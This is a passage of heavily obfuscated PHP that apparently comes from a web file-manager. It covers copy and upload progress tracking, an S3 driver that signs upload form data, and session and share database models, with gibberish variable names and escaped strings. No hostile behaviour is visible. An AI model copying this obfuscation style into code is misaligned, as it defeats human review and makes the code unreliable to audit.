$£ÏÚòôÃ[110]) { $”Õ³òŞÕ[$£ÏÚòôÃ[1810]] = $”Õ³òŞÕ[$£ÏÚòôÃ[1809]] + $”Õ³òŞÕ[$£ÏÚòôÃ[1805]] * 0.5 + $”Õ³òŞÕ[$£ÏÚòôÃ[1806]] * 0.5; } } } } $”Õ³òŞÕ[$£ÏÚòôÃ[1754]] = $”Õ³òŞÕ[$£ÏÚòôÃ[1810]] / $”Õ³òŞÕ[$£ÏÚòôÃ[818]]; if ($”Õ³òŞÕ[$£ÏÚòôÃ[1754]] > 0) { $–Ä‡Õ = timeFloat() - $”Õ³òŞÕ[$£ÏÚòôÃ[1756]] - $”Õ³òŞÕ[$£ÏÚòôÃ[1759]]; $”Õ³òŞÕ[$£ÏÚòôÃ[1760]] = $–Ä‡Õ * (1 - $”Õ³òŞÕ[$£ÏÚòôÃ[1754]]) / $”Õ³òŞÕ[$£ÏÚòôÃ[1754]]; } } public function addPath($ƒŒî§†½) { $Î“˜¯ü© =& $_SERVER[‹è™Ü¸Ñ]; if (!$ƒŒî§†½) { return; } $´Ëëø­ß =& $this->task; $Øô—‘¼± = IO::infoWithChildren($ƒŒî§†½); $¿û™—ª’ = $´Ëëø­ß[$Î“˜¯ü©[1814]] ? $´Ëëø­ß[$Î“˜¯ü©[1814]][$Î“˜¯ü©[1815]] : 0; $´Ëëø­ß[$Î“˜¯ü©[1814]] = array($Î“˜¯ü©[1815] => $¿û™—ª’ + 1, $Î“˜¯ü©[494] => $Øô—‘¼±[$Î“˜¯ü©[32]], $Î“˜¯ü©[87] => $Øô—‘¼±[$Î“˜¯ü©[87]], $Î“˜¯ü©[582] => $Øô—‘¼±[$Î“˜¯ü©[582]] ? $Øô—‘¼±[$Î“˜¯ü©[582]] : $Øô—‘¼±[$Î“˜¯ü©[87]]); if ($Øô—‘¼±[$Î“˜¯ü©[33]] == $Î“˜¯ü©[230]) { $´Ëëø­ß[$Î“˜¯ü©[1121]] += 1; } else { $´Ëëø­ß[$Î“˜¯ü©[1121]] += $Øô—‘¼±[$Î“˜¯ü©[82]][$Î“˜¯ü©[80]]; if ($Øô—‘¼±[$Î“˜¯ü©[193]]) { $´Ëëø­ß[$Î“˜¯ü©[1121]] += $Øô—‘¼±[$Î“˜¯ü©[82]][$Î“˜¯ü©[81]] + 1; } } $´Ëëø­ß[$Î“˜¯ü©[818]] += $Øô—‘¼±[$Î“˜¯ü©[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($Ï“‹…ª) { } public function sourceAddHashEnd($£¬û‘‡) { } public function sourceAddFileStart($“úùÁß) { $™å ­ø¾ =& $_SERVER[‹è™Ü¸Ñ]; $×óñÁÀ =& $this->task; $×óñÁÀ[$™å ­ø¾[1805]] = $“úùÁß[$™å ­ø¾[79]]; $×óñÁÀ[$™å ­ø¾[1803]] = $“úùÁß[$™å ­ø¾[32]]; $×óñÁÀ[$™å ­ø¾[1123]] = $“úùÁß[$™å ­ø¾[32]]; $×óñÁÀ[$™å ­ø¾[1816]] = $“úùÁß[$™å ­ø¾[87]]; $this->update(); } public function sourceAddFileEnd($ËìÂ©ƒ”) { $›ààŸô =& $_SERVER[‹è™Ü¸Ñ]; $áãÉº½’ =& $this->task; $áãÉº½’[$›ààŸô[1810]] += $ËìÂ©ƒ”[$›ààŸô[79]]; $áãÉº½’[$›ààŸô[1816]] = $ËìÂ©ƒ”[$›ààŸô[87]]; $this->update(1); } public function copyFileStart($–¾’½â, $µ•İ¹ˆè, $ğ†äü±¼, $Óáş»ÁŠ, $¼”ÇØÃÏ, $ş”Çõ) { $ãËê¡Ü» =& $_SERVER[‹è™Ü¸Ñ]; $ÄÉâÚ«ê = $¼”ÇØÃÏ; if ($ÄÉâÚ«ê == $GLOBALS[$ãËê¡Ü»[1817]]) { $ÄÉâÚ«ê = $GLOBALS[$ãËê¡Ü»[1818]]; } $GLOBALS[$ãËê¡Ü»[1818]] = $¼”ÇØÃÏ; $GLOBALS[$ãËê¡Ü»[1817]] = $ş”Çõ; $ãÒª±ò =& $this->task; $ãÒª±ò[$ãËê¡Ü»[1803]] = $ÄÉâÚ«ê; $ãÒª±ò[$ãËê¡Ü»[1805]] = (int) $–¾’½â->size($µ•İ¹ˆè); $ãÒª±ò[$ãËê¡Ü»[1806]] = 0; $ãÒª±ò[$ãËê¡Ü»[1123]] = $ãËê¡Ü»[12]; $ãÒª±ò[$ãËê¡Ü»[1807]] = $ãËê¡Ü»[12]; $ãÒª±ò[$ãËê¡Ü»[1808]] = 0; $Áû¨§ï = $ãÒª±ò[$ãËê¡Ü»[1805]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ãÒª±ò[$ãËê¡Ü»[475]] . $ãËê¡Ü»[1819]); if ($Áû¨§ï && file_exists(get_path_father($Óáş»ÁŠ))) { Cache::set($ãÒª±ò[$ãËê¡Ü»[475]] . $ãËê¡Ü»[1819], $Óáş»ÁŠ); $ãÒª±ò[$ãËê¡Ü»[1776]] = array($ãËê¡Ü»[1820], $ãËê¡Ü»[1821]); } $this->update(0, $Áû¨§ï); } public static function updateCopyLocalFileSize($ùàÕÑÎŠ) { $Âˆ¤È =& $_SERVER[‹è™Ü¸Ñ]; $ĞËõ˜Í = Cache::get($ùàÕÑÎŠ[$Âˆ¤È[475]] . $Âˆ¤È[1819]); if (!$ĞËõ˜Í || !file_exists($ĞËõ˜Í)) { return $ùàÕÑÎŠ; } $ùàÕÑÎŠ[$Âˆ¤È[1806]] = @filesize($ĞËõ˜Í); $ùàÕÑÎŠ[$Âˆ¤È[1810]] += $ùàÕÑÎŠ[$Âˆ¤È[1806]]; self::updateTask($ùàÕÑÎŠ); return $ùàÕÑÎŠ; } public function copyFileEnd($È˜”ªÜ°, $ôˆü—è¸, $‚Úùêº, $ÚŠê¿Óã, $œ¯ÓõÏ, $Ô–ÛÃËÎ) { $¯Ú’ƒ¯ =& $_SERVER[‹è™Ü¸Ñ]; $áï„œÄ· =& $this->task; $áï„œÄ·[$¯Ú’ƒ¯[1806]] = $áï„œÄ·[$¯Ú’ƒ¯[1805]]; $áï„œÄ·[$¯Ú’ƒ¯[1807]] = $¯Ú’ƒ¯[12]; unset($áï„œÄ·[$¯Ú’ƒ¯[1776]]); if ($œ¯ÓõÏ == $áï„œÄ·[$¯Ú’ƒ¯[1803]]) { $áï„œÄ·[$¯Ú’ƒ¯[1809]] += $áï„œÄ·[$¯Ú’ƒ¯[1805]]; $áï„œÄ·[$¯Ú’ƒ¯[1810]] = $áï„œÄ·[$¯Ú’ƒ¯[1809]]; $Ü«óºÉ = 1; if (isset($áï„œÄ·[$¯Ú’ƒ¯[1816]]) && $áï„œÄ·[$¯Ú’ƒ¯[1816]] == $ôˆü—è¸) { $Ü«óºÉ = 0; } $this->update($Ü«óºÉ); } else { $this->update(); $áï„œÄ·[$¯Ú’ƒ¯[1806]] = 0; } Cache::remove($áï„œÄ·[$¯Ú’ƒ¯[475]] . $¯Ú’ƒ¯[1819]); self::log($¯Ú’ƒ¯[1822] . $ôˆü—è¸ . $¯Ú’ƒ¯[73] . $ÚŠê¿Óã . $¯Ú’ƒ¯[262] . $œ¯ÓõÏ . $¯Ú’ƒ¯[1823] . $áï„œÄ·[$¯Ú’ƒ¯[1803]]); } public function updateFileEnd($¬£˜á‹, $Ñëƒ…İ) { $¡•¸“íœ =& $_SERVER[‹è™Ü¸Ñ]; $ŞÙ…ğ» =& $this->task; $ŞÙ…ğ»[$¡•¸“íœ[1803]] = $¬£˜á‹; $ŞÙ…ğ»[$¡•¸“íœ[1805]] = $Ñëƒ…İ; $ŞÙ…ğ»[$¡•¸“íœ[1809]] += $Ñëƒ…İ; $ŞÙ…ğ»[$¡•¸“íœ[1810]] = $ŞÙ…ğ»[$¡•¸“íœ[1809]]; $this->update(1); self::log($¡•¸“íœ[1824] . $¬£˜á‹); } public function sourceModelCopy($À¶Ààïø) { $ôîá²È­ =& $_SERVER[‹è™Ü¸Ñ]; $Ã÷‚ºÔ¹ = $À¶Ààïø[0]; $ë³­ß‰Ÿ = $À¶Ààïø[1]; $¿é¶™ =& $this->task; $this->sourceModelCopyFlag = !0; $üûñŞÄ = 0; switch ($Ã÷‚ºÔ¹) { case $ôîá²È­[635]: $üûñŞÄ = 1; break; case $ôîá²È­[638]: $¿é¶™[$ôîá²È­[1803]] = $ë³­ß‰Ÿ[$ôîá²È­[32]]; break; case $ôîá²È­[640]: $üûñŞÄ = intval($À¶Ààïø[$ôîá²È­[456]] * 0.4); break; case $ôîá²È­[642]: $üûñŞÄ = intval($À¶Ààïø[$ôîá²È­[456]] * 0.2); break; case $ôîá²È­[644]: $üûñŞÄ = intval($À¶Ààïø[$ôîá²È­[456]] * 0.4); break; } $this->update($üûñŞÄ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($½Šàà…Ş, $ÇÊÏ«£) { $³ä”Œ•„ =& $_SERVER[‹è™Ü¸Ñ]; $this->sourceModelCopyFlag = !0; $™½“é²æ = 1; if (isset($½Šàà…Ş[$³ä”Œ•„[82]])) { $™½“é²æ = $½Šàà…Ş[$³ä”Œ•„[82]][$³ä”Œ•„[80]]; $™½“é²æ = $™½“é²æ + $½Šàà…Ş[$³ä”Œ•„[82]][$³ä”Œ•„[81]] + 1; } $this->update($™½“é²æ); $this->sourceModelCopyFlag = !1; } public function sourceMove($ÏÛè™ø–) { $this->sourceRemove($ÏÛè™ø–, !1); } public function curlProgress($Ó›ŒË÷¦, $£ä”„¨, $—¨Ãï‚, $ÏÄºÙüï, $äœï­™) { $£ü»ù±® =& $_SERVER[‹è™Ü¸Ñ]; $²¯’¡ç° =& $this->task; if ($äœï­™ > 0) { $²¯’¡ç°[$£ü»ù±®[1123]] = $£ü»ù±®[1825]; $²¯’¡ç°[$£ü»ù±®[1807]] = $£ü»ù±®[110]; if ($²¯’¡ç°[$£ü»ù±®[1805]]) { $²¯’¡ç°[$£ü»ù±®[1806]] = $äœï­™; } if ($²¯’¡ç°[$£ü»ù±®[1808]]) { $²¯’¡ç°[$£ü»ù±®[1806]] = $äœï­™ + $²¯’¡ç°[$£ü»ù±®[1808]]; } } else { if ($—¨Ãï‚ > 0) { if ($²¯’¡ç°[$£ü»ù±®[1805]] == $£ä”„¨) { $²¯’¡ç°[$£ü»ù±®[1806]] = $—¨Ãï‚; $²¯’¡ç°[$£ü»ù±®[1123]] = $£ü»ù±®[1826]; $²¯’¡ç°[$£ü»ù±®[1807]] = $£ü»ù±®[1259]; } } } $this->update(); } public function curlProgressStart($ÂÁ¤‹‹¾) { } public function curlProgressEnd($ö¹ş©ß³) { $î÷Üû•ä =& $_SERVER[‹è™Ü¸Ñ]; $…‰ÚîÓ¿ =& $this->task; $÷‡á»¡™ = curl_getinfo($ö¹ş©ß³); $Õ‚”„ = $÷‡á»¡™[$î÷Üû•ä[1827]]; if ($Õ‚”„ == -1) { $Õ‚”„ = $÷‡á»¡™[$î÷Üû•ä[1828]]; } if ($…‰ÚîÓ¿[$î÷Üû•ä[1807]] == $î÷Üû•ä[110] && $Õ‚”„) { $…‰ÚîÓ¿[$î÷Üû•ä[1808]] += $Õ‚”„; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ÔğáßÜ· =& $_SERVER[‹è™Ü¸Ñ]; $ëæäşãÑ =& $this->task; $ëæäşãÑ[$ÔğáßÜ·[1829]] = 1; Hook::bind($ÔğáßÜ·[1797], array($this, $ÔğáßÜ·[1830])); Hook::bind($ÔğáßÜ·[1799], array($this, $ÔğáßÜ·[1831])); Hook::bind($ÔğáßÜ·[1801], array($this, $ÔğáßÜ·[1832])); } protected function endAfter() { $§—ùÚ® =& $_SERVER[‹è™Ü¸Ñ]; Hook::unbind($§—ùÚ®[1797], array($this, $§—ùÚ®[1830])); Hook::unbind($§—ùÚ®[1799], array($this, $§—ùÚ®[1831])); Hook::unbind($§—ùÚ®[1801], array($this, $§—ùÚ®[1832])); } public function progressStart($Áç÷Ç–Õ) { $¼ÓŞœÙ =& $_SERVER[‹è™Ü¸Ñ]; $ãè³ß×œ = curl_getinfo($Áç÷Ç–Õ); self::log($¼ÓŞœÙ[1833] . $ãè³ß×œ[$¼ÓŞœÙ[383]]); self::valueSet($this->task[$¼ÓŞœÙ[475]], $this->task); } public function progressEnd($½İê†½®) { $İ¬ûÓû¥ =& $_SERVER[‹è™Ü¸Ñ]; self::log($İ¬ûÓû¥[1834] . $this->task[$İ¬ûÓû¥[475]]); $this->end(); } public function progress($ŠŸºèÂ, $»™É®ö“, $¥¢ƒì» , $Öëß³ûÇ, $¡‡¼´†Ş) { $á¸€Š”‚ =& $_SERVER[‹è™Ü¸Ñ]; $¸·²òªû =& $this->task; if ($¡‡¼´†Ş > 0) { $¸·²òªû[$á¸€Š”‚[1121]] = $¸·²òªû[$á¸€Š”‚[1121]] == 0 ? $Öëß³ûÇ : $¸·²òªû[$á¸€Š”‚[1121]]; $¸·²òªû[$á¸€Š”‚[1753]] = $¡‡¼´†Ş; } else { if ($¥¢ƒì»  > 0) { $¸·²òªû[$á¸€Š”‚[1121]] = $¸·²òªû[$á¸€Š”‚[1121]] == 0 ? $»™É®ö“ : $¸·²òªû[$á¸€Š”‚[1121]]; $¸·²òªû[$á¸€Š”‚[1753]] = $¥¢ƒì» ; } } $this->update(); self::log("\160\x72\x6f\x67\162\145\163\163\110\164\164\x70\72\x64\157\167\156\72{$¥¢ƒì» }\57{$»™É®ö“}\73\x20\x75\160\154\x6f\x61\x64\x3a{$¡‡¼´†Ş}\x2f{$Öëß³ûÇ}\73"); } } goto C†¢Ø®¿–; B·¸„²”¿Ş: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¤‡ó©—Õ) { parent::__construct($¤‡ó©—Õ); } public function uploadFormData($•›òÛ×, $ııæ–ù‚ = 3600) { $‡—›¼ =& $_SERVER[‹è™Ü¸Ñ]; $“ûƒÆ” = $‡—›¼[229]; $õä”¨ùğ = $‡—›¼[270]; $â˜É»…Í = $‡—›¼[62]; $×¼£ÍÛÚ = gmdate($‡—›¼[271]); $ÕªûõãŸ = gmdate($‡—›¼[272]); $éÑßÓ¹É = $‡—›¼[273]; $Ù‘ˆ·Ä = $ııæ–ù‚ . $‡—›¼[12]; $Ö…¡‹Ñ = $‡—›¼[274]; $šÏ•ã€Ø = array($this->accessKey, $ÕªûõãŸ, $this->region, $â˜É»…Í, $éÑßÓ¹É); $êâ›¨¨ = implode($‡—›¼[8], $šÏ•ã€Ø); $•Üãœø‡ = array($‡—›¼[275] => gmdate($‡—›¼[299], strtotime($‡—›¼[277])), $‡—›¼[278] => array(array($‡—›¼[279] => $this->bucket), array($‡—›¼[280] => $“ûƒÆ”), array($‡—›¼[281], $‡—›¼[282], $‡—›¼[12]), array($‡—›¼[281], $‡—›¼[283], $‡—›¼[12]), array($‡—›¼[281], $‡—›¼[284], $‡—›¼[12]), array($‡—›¼[285] => $Ö…¡‹Ñ), array($‡—›¼[286] => $êâ›¨¨), array($‡—›¼[287] => $õä”¨ùğ), array($‡—›¼[288] => $×¼£ÍÛÚ), array($‡—›¼[289] => $Ù‘ˆ·Ä))); $–Š¥Ÿ×Ü = base64_encode(json_encode($•Üãœø‡)); $Ø²Âí´ = hash_hmac($‡—›¼[290], $ÕªûõãŸ, $‡—›¼[291] . $this->secret, !0); $ó¨ì¨Ø = hash_hmac($‡—›¼[290], $this->region, $Ø²Âí´, !0); $“§–çÔ÷ = hash_hmac($‡—›¼[290], $â˜É»…Í, $ó¨ì¨Ø, !0); $Ô½ñÃ = hash_hmac($‡—›¼[290], $éÑßÓ¹É, $“§–çÔ÷, !0); $ª®øà—û = hash_hmac($‡—›¼[290], $–Š¥Ÿ×Ü, $Ô½ñÃ); $ç…¡–“ = array($‡—›¼[246] => $‡—›¼[12], $‡—›¼[292] => $‡—›¼[12], $‡—›¼[280] => $“ûƒÆ”, $‡—›¼[285] => $Ö…¡‹Ñ, $‡—›¼[293] => $–Š¥Ÿ×Ü, $‡—›¼[294] => $êâ›¨¨, $‡—›¼[295] => $õä”¨ùğ, $‡—›¼[296] => $×¼£ÍÛÚ, $‡—›¼[297] => $Ù‘ˆ·Ä, $‡—›¼[298] => $ª®øà—û, $‡—›¼[208] => $this->getHost()); return $ç…¡–“; } public function multiUploadFormData($À—Ü¬ºø, $èÎš¹¼û = 3600) { $¿ˆÃâ¤Ñ =& $_SERVER[‹è™Ü¸Ñ]; $œ”Ôùáë = gmdate($¿ˆÃâ¤Ñ[300]); $ö£‹Ú€ú = array(); $É¤±ìå¥ = $this->client->getUploadId($this->bucket, $À—Ü¬ºø, $ö£‹Ú€ú); if (!$É¤±ìå¥) { return !1; } return array($¿ˆÃâ¤Ñ[254] => $É¤±ìå¥, $¿ˆÃâ¤Ñ[208] => $this->getHost() . $¿ˆÃâ¤Ñ[8] . $this->pathEncode($À—Ü¬ºø), $¿ˆÃâ¤Ñ[255] => $œ”Ôùáë, $¿ˆÃâ¤Ñ[97] => $À—Ü¬ºø); } public function multiUploadAuthData($Ó‚ã›, $¢ºœÎÇ¸ = array()) { $¼ä“ƒÛ =& $_SERVER[‹è™Ü¸Ñ]; $Ù¬â¿¦ = isset($¢ºœÎÇ¸[$¼ä“ƒÛ[169]]) ? $¢ºœÎÇ¸[$¼ä“ƒÛ[169]] : $¼ä“ƒÛ[12]; $ßë’¶§¹ = $¢ºœÎÇ¸[$¼ä“ƒÛ[97]]; unset($¢ºœÎÇ¸[$¼ä“ƒÛ[97]]); if (isset($¢ºœÎÇ¸[$¼ä“ƒÛ[256]])) { return $this->listUploadParts($ßë’¶§¹, $¢ºœÎÇ¸); } $É«Ï›Ë° = array(); if (isset($¢ºœÎÇ¸[$¼ä“ƒÛ[301]])) { $É«Ï›Ë°[$¼ä“ƒÛ[302]] = $¢ºœÎÇ¸[$¼ä“ƒÛ[301]]; } $¸Õ€‘²Û = explode($¼ä“ƒÛ[210], $this->getHost()); $ß”À±Š = array($¼ä“ƒÛ[303] => $¸Õ€‘²Û[1], $¼ä“ƒÛ[304] => $¼ä“ƒÛ[12], $¼ä“ƒÛ[246] => $¼ä“ƒÛ[123], $¼ä“ƒÛ[292] => $¢ºœÎÇ¸[$¼ä“ƒÛ[79]]); $õË¼«úÓ = $¼ä“ƒÛ[259]; $ßÅû¿æ« = $¼ä“ƒÛ[8] . $this->pathEncode($ßë’¶§¹) . $Ù¬â¿¦; $Æˆ²„µÖ = $this->client->__getSignatureV4($É«Ï›Ë°, $ß”À±Š, $õË¼«úÓ, $ßÅû¿æ«); if (strpos($Ù¬â¿¦, $¼ä“ƒÛ[258]) === 0) { if (isset($É«Ï›Ë°[$¼ä“ƒÛ[302]])) { $™Õƒû´½ = $É«Ï›Ë°[$¼ä“ƒÛ[302]]; } else { if (isset($Æˆ²„µÖ[$¼ä“ƒÛ[302]])) { $™Õƒû´½ = $Æˆ²„µÖ[$¼ä“ƒÛ[302]]; } else { $™Õƒû´½ = hash($¼ä“ƒÛ[290], $¼ä“ƒÛ[12]); } } return array($¼ä“ƒÛ[265] => $Æˆ²„µÖ[$¼ä“ƒÛ[265]], $¼ä“ƒÛ[302] => $™Õƒû´½, $¼ä“ƒÛ[255] => $Æˆ²„µÖ[$¼ä“ƒÛ[305]]); } return $Æˆ²„µÖ[$¼ä“ƒÛ[265]]; } public function listUploadParts($ÅÃ¤‚‘², $îëäôî­ = array()) { $œòÀÚ„ı =& $_SERVER[‹è™Ü¸Ñ]; $¥¸öæ¢® = str_replace($œòÀÚ„ı[266], $œòÀÚ„ı[12], $îëäôî­[$œòÀÚ„ı[169]]); $öù”ÑŒ½ = $this->client->listParts($this->bucket, $ÅÃ¤‚‘², $¥¸öæ¢®); if (!$öù”ÑŒ½) { return !1; } $ğÑ¡ñÑ = $œòÀÚ„ı[306]; foreach ($öù”ÑŒ½ as $›óæ®¶ğ) { $ğÑ¡ñÑ .= $œòÀÚ„ı[307] . "\x3c\120\x61\162\164\x4e\x75\x6d\142\x65\162\76{$›óæ®¶ğ[$œòÀÚ„ı[308]]}\74\x2f\120\141\x72\164\x4e\x75\x6d\142\145\162\76\xa" . "\74\x45\124\141\147\76{$›óæ®¶ğ[$œòÀÚ„ı[309]]}\74\57\x45\124\x61\x67\x3e\xa" . $œòÀÚ„ı[310]; } $ğÑ¡ñÑ .= $œòÀÚ„ı[311]; $«Úá­ãü = array(); $Ëü‰úÇ = explode($œòÀÚ„ı[210], $this->getHost()); $æƒ‚Ÿì = array($œòÀÚ„ı[303] => $Ëü‰úÇ[1], $œòÀÚ„ı[246] => $œòÀÚ„ı[123], $œòÀÚ„ı[292] => strlen($ğÑ¡ñÑ)); $Šê £Î¤ = $œòÀÚ„ı[257]; $Û­µƒğå = $œòÀÚ„ı[8] . $this->pathEncode($ÅÃ¤‚‘²) . $îëäôî­[$œòÀÚ„ı[169]]; $‘ãÛÅåÙ = $this->client->__getSignatureV4($«Úá­ãü, $æƒ‚Ÿì, $Šê £Î¤, $Û­µƒğå, $ğÑ¡ñÑ); return array($œòÀÚ„ı[265] => $‘ãÛÅåÙ[$œòÀÚ„ı[265]], $œòÀÚ„ı[255] => $‘ãÛÅåÙ[$œòÀÚ„ı[305]], $œòÀÚ„ı[267] => $öù”ÑŒ½, $œòÀÚ„ı[302] => $‘ãÛÅåÙ[$œòÀÚ„ı[302]]); } public function link($ëïêêÚ, $¤•¿…›¶ = array()) { return parent::link($ëïêêÚ, $¤•¿…›¶); } public function fileOut($¾ò´Õæ, $ùŸˆ‰‹© = false, $ÂİÄ§ß´ = false, $š÷°»€â = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[‹è™Ü¸Ñ][312])) { return parent::fileOutServer($¾ò´Õæ, $ùŸˆ‰‹©, $ÂİÄ§ß´, $š÷°»€â); } parent::fileOut($¾ò´Õæ, $ùŸˆ‰‹©, $ÂİÄ§ß´, $š÷°»€â); } public function fileOutImage($¡…­Åˆ, $„ã¯‘¸ = 250) { if (strstr($this->endpoint, $_SERVER[‹è™Ü¸Ñ][312])) { return parent::fileOutImageServer($¡…­Åˆ, $„ã¯‘¸); } parent::fileOutImage($¡…­Åˆ, $„ã¯‘¸); } public function fileOutLink($ëëñ¤°§) { $·’ì¸ÆÄ =& $_SERVER[‹è™Ü¸Ñ]; if (substr($ëëñ¤°§, 0, 7) == $·’ì¸ÆÄ[313]) { $ëëñ¤°§ = $·’ì¸ÆÄ[314] . substr($ëëñ¤°§, 7); } header($·’ì¸ÆÄ[175] . $ëëñ¤°§); die; } } define($_SERVER[‹è™Ü¸Ñ][315], 1); define($_SERVER[‹è™Ü¸Ñ][316], 2); goto E‹Æöå—™ï; e¿ÒºÏã‘: class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\164\x65\155\137\163\x65\x73\163\151\x6f\x6e"; public function get($¢Ï¢†¿¨) { $²·â¶±ˆ =& $_SERVER[‹è™Ü¸Ñ]; $ö˜³î¦ê = $this->where(array($²·â¶±ˆ[2090] => $¢Ï¢†¿¨))->find(); if (!is_array($ö˜³î¦ê)) { return !1; } return $ö˜³î¦ê[$²·â¶±ˆ[171]]; } public function set($§Îù»“ş, $ò½¬æØ®, $šµ£ã = 3600) { $öÂ§ß‹ç =& $_SERVER[‹è™Ü¸Ñ]; $ÑßâÁÏ‘ = array($öÂ§ß‹ç[2090] => $§Îù»“ş, $öÂ§ß‹ç[1990] => $ò½¬æØ®, $öÂ§ß‹ç[2091] => $šµ£ã + time()); if (Session::get($öÂ§ß‹ç[2092])) { $ÑßâÁÏ‘[$öÂ§ß‹ç[1752]] = Session::get($öÂ§ß‹ç[2092]); } else { $ÑßâÁÏ‘[$öÂ§ß‹ç[1752]] = 0; } if ($this->get($§Îù»“ş)) { return $this->where(array($öÂ§ß‹ç[2090] => $§Îù»“ş))->save($ÑßâÁÏ‘); } else { return $this->add($ÑßâÁÏ‘, array(), !0); } } public function remove($‘¾ûÏ­Ã) { return $this->where(array($_SERVER[‹è™Ü¸Ñ][2090] => $‘¾ûÏ­Ã))->delete(); } public function clearTimeout() { return $this->where($_SERVER[‹è™Ü¸Ñ][2093] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\145"; protected $dataAuto = array(array("\155\x6f\x64\x69\x66\x79\x54\151\x6d\145", "\164\x69\x6d\145", "\x69\156\163\145\162\x74\54\x75\160\x64\141\x74\x65", "\x66\165\x6e\143\x74\x69\x6f\x6e"), array("\x63\162\145\141\x74\145\x54\x69\x6d\145", "\164\x69\x6d\145", "\151\x6e\x73\145\x72\x74", "\146\x75\x6e\x63\x74\x69\157\156"), array("\157\160\x74\151\x6f\156\163", '', "\x69\156\x73\145\x72\164\54\x75\x70\x64\141\x74\x65\x2c\x73\x65\x6c\145\x63\x74", "\x6a\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Œ§ü¼Öƒ) { $ÈÉ¯»° =& $_SERVER[‹è™Ü¸Ñ]; $ÙÇ¸åÍö = isset($Œ§ü¼Öƒ[0]) ? $Œ§ü¼Öƒ[0] : !1; return array($ÈÉ¯»°[2094] => array(USER_ID, $ÈÉ¯»°[2095]), $ÈÉ¯»°[2035] => array($ÙÇ¸åÍö, $ÈÉ¯»°[2096])); } protected function listSimple() { $ÃŒ–¿Ã = array($_SERVER[‹è™Ü¸Ñ][1752] => USER_ID); $å­ôÑ¸ = $this->field($this->fieldList)->where($ÃŒ–¿Ã)->select(); return $å­ôÑ¸ ? $å­ôÑ¸ : array(); } protected function getInfo($Õœ­å·, $ûúÚâª„ = false) { $ïç‰‘Ñ =& $_SERVER[‹è™Ü¸Ñ]; if ($ûúÚâª„) { return $this->_getShareInfo(array($ïç‰‘Ñ[665] => $Õœ­å·)); } $ÔÎèØ” = $this->cacheFunctionGet($ïç‰‘Ñ[2037], $Õœ­å·); return $ÔÎèØ”; } public function getInfoByHash($¶İçàœù) { return $this->_getShareInfo(array($_SERVER[‹è™Ü¸Ñ][2097] => $¶İçàœù)); } public function getInfoByPath($ãŞß¶èâ) { $Ô¼·›í¶ =& $_SERVER[‹è™Ü¸Ñ]; $ø™ªô§± = array($Ô¼·›í¶[1752] => USER_ID, $Ô¼·›í¶[193] => $ãŞß¶èâ); return $this->_getShareInfo($ø™ªô§±); } public function getInfoBySourcePath($ÑÃÚŒûô) { $ó¢â­ =& $_SERVER[‹è™Ü¸Ñ]; $ÎĞ‡íî‚ = array($ó¢â­[1752] => USER_ID, $ó¢â­[1237] => $ÑÃÚŒûô); return $this->_getShareInfo($ÎĞ‡íî‚); } private function _getShareInfo($ŞÚö¢šÍ) { $Œ‚ŸúşÂ =& $_SERVER[‹è™Ü¸Ñ]; $§Ú¬Õ›Ò = $this->where($ŞÚö¢šÍ)->find(); if (!$§Ú¬Õ›Ò) { return !1; } $ŞÚö¢šÍ = array($Œ‚ŸúşÂ[665] => $§Ú¬Õ›Ò[$Œ‚ŸúşÂ[665]]); $ÂŸ ü = $Œ‚ŸúşÂ[2098]; $—ô¶İö´ = Model($Œ‚ŸúşÂ[666])->order($Œ‚ŸúşÂ[475])->field($ÂŸ ü)->where($ŞÚö¢šÍ)->select(); if ($§Ú¬Õ›Ò[$Œ‚ŸúşÂ[193]] == $Œ‚ŸúşÂ[228]) { $§Ú¬Õ›Ò[$Œ‚ŸúşÂ[90]] = IO::info($§Ú¬Õ›Ò[$Œ‚ŸúşÂ[1237]]); } else { $§Ú¬Õ›Ò[$Œ‚ŸúşÂ[90]] = Model($Œ‚ŸúşÂ[1398])->pathInfo($§Ú¬Õ›Ò[$Œ‚ŸúşÂ[193]]); } $§Ú¬Õ›Ò[$Œ‚ŸúşÂ[2099]] = $—ô¶İö´; return $§Ú¬Õ›Ò; } protected function getInfoAuth($‹Ü©Òóí) { $µÙ¾ë±¨ =& $_SERVER[‹è™Ü¸Ñ]; $â¾‡Ü› = $this->getInfo($‹Ü©Òóí); if ($â¾‡Ü›[$µÙ¾ë±¨[1752]] == USER_ID) { $â¾‡Ü›[$µÙ¾ë±¨[487]] = $â¾‡Ü›[$µÙ¾ë±¨[90]][$µÙ¾ë±¨[487]]; } else { $â¾‡Ü›[$µÙ¾ë±¨[487]] = Model($µÙ¾ë±¨[567])->authMake($â¾‡Ü›[$µÙ¾ë±¨[2099]]); } return $â¾‡Ü›; } protected function listData($Öµƒ›Ê— = null, $·¾¯à³ü = 300) { $Ş­ƒá¸“ =& $_SERVER[‹è™Ü¸Ñ]; $ãÖĞ¤­ = array(array($Ş­ƒá¸“[562] => array($Ş­ƒá¸“[1070], 0), $Ş­ƒá¸“[663] => array($Ş­ƒá¸“[1070], 0), $Ş­ƒá¸“[2100] => $Ş­ƒá¸“[2053])); if ($Öµƒ›Ê— == $Ş­ƒá¸“[2101]) { $ãÖĞ¤­ = array($Ş­ƒá¸“[562] => 1); } else { if ($Öµƒ›Ê— == $Ş­ƒá¸“[1222]) { $ãÖĞ¤­ = array($Ş­ƒá¸“[663] => 1); } } $ãÖĞ¤­[$Ş­ƒá¸“[1752]] = USER_ID; $Õê¼Ì = $this->where($ãÖĞ¤­)->selectPage($·¾¯à³ü); return $Õê¼Ì; } protected function listToMe($Ñ”ñë×¼ = 300) { $ë€âò´Ó =& $_SERVER[‹è™Ü¸Ñ]; $¨Êˆ¬ñÈ = Model($ë€âò´Ó[2102])->userGroupParents(USER_ID); $¿µœê×é = array($ë€âò´Ó[648] => SourceModel::TYPE_USER, $ë€âò´Ó[569] => USER_ID); if ($¨Êˆ¬ñÈ) { $¿µœê×é = array(array($ë€âò´Ó[648] => SourceModel::TYPE_USER, $ë€âò´Ó[569] => USER_ID), array($ë€âò´Ó[648] => SourceModel::TYPE_GROUP, 